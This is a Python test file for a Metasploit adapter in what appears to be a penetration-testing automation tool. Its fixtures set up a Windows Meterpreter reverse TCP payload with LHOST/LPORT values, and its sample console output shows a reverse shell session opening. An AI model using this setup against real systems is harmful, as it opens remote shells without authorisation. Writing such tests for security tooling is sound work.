"""Tests for Metasploit adapter"""
import pytest
from app.tools.adapters.metasploit_adapter import MetasploitAdapter
from app.tools.base import ToolCategory


def test_metasploit_metadata():
    """Test Metasploit adapter metadata"""
    adapter = MetasploitAdapter()
    metadata = adapter.get_metadata()

    assert metadata.name == "metasploit"
    assert metadata.category == ToolCategory.EXPLOITATION
    assert metadata.executable == "msfconsole"
    assert metadata.requires_root == False
    assert metadata.default_timeout == 900


def test_metasploit_validate_parameters():
    """Test Metasploit parameter validation"""
    adapter = MetasploitAdapter()

    # Valid: module and target present
    assert adapter.validate_parameters({
        "module": "auxiliary/scanner/http/dir_scanner",
        "rhosts": "192.168.1.1"
    }) == True

    # Valid: module and required options
    assert adapter.validate_parameters({
        "module": "exploit/multi/handler",
        "payload": "windows/meterpreter/reverse_tcp"
    }) == True

    # Invalid: no module
    assert adapter.validate_parameters({"rhosts": "192.168.1.1"}) == False

    # Invalid: empty params
    assert adapter.validate_parameters({}) == False


def test_metasploit_build_command(tmp_path):
    """Test Metasploit command building"""
    adapter = MetasploitAdapter()

    # Store temp dir for resource file
    adapter._temp_dir = tmp_path

    params = {
        "module": "auxiliary/scanner/http/dir_scanner",
        "rhosts": "192.168.1.1",
        "rport": 80,
        "threads": 10
    }

    cmd = adapter.build_command(params)

    assert "msfconsole" in cmd
    assert "-q" in cmd  # Quiet mode
    assert "-x" in cmd  # Execute commands

    # Should contain module use command
    command_string = " ".join(cmd)
    assert "use auxiliary/scanner/http/dir_scanner" in command_string
    assert "set RHOSTS 192.168.1.1" in command_string
    assert "run" in command_string or "exploit" in command_string


def test_metasploit_build_command_with_payload():
    """Test Metasploit command with payload"""
    adapter = MetasploitAdapter()

    params = {
        "module": "exploit/multi/handler",
        "payload": "windows/meterpreter/reverse_tcp",
        "lhost": "192.168.1.100",
        "lport": 4444
    }

    cmd = adapter.build_command(params)
    command_string = " ".join(cmd)

    assert "set PAYLOAD windows/meterpreter/reverse_tcp" in command_string
    assert "set LHOST 192.168.1.100" in command_string
    assert "set LPORT 4444" in command_string


def test_metasploit_parse_output():
    """Test Metasploit output parsing"""
    adapter = MetasploitAdapter()

    # Sample msfconsole output from auxiliary scanner
    sample_output = '''[*] Using auxiliary/scanner/http/dir_scanner
[*] Scanned 1 of 1 hosts (100% complete)
[+] Found http://192.168.1.1:80/admin/
[+] Found http://192.168.1.1:80/backup/
[*] Auxiliary module execution completed
'''

    result = adapter.parse_output(sample_output, "", 0)

    assert "module_output" in result
    assert "findings" in result
    assert len(result["findings"]) == 2
    assert "http://192.168.1.1:80/admin/" in result["findings"][0]


def test_metasploit_parse_output_exploit():
    """Test Metasploit exploit output parsing"""
    adapter = MetasploitAdapter()

    sample_output = '''[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage (175174 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened
'''

    result = adapter.parse_output(sample_output, "", 0)

    assert "session_opened" in result
    assert result["session_opened"] == True
    assert "sessions" in result
    assert len(result["sessions"]) >= 1
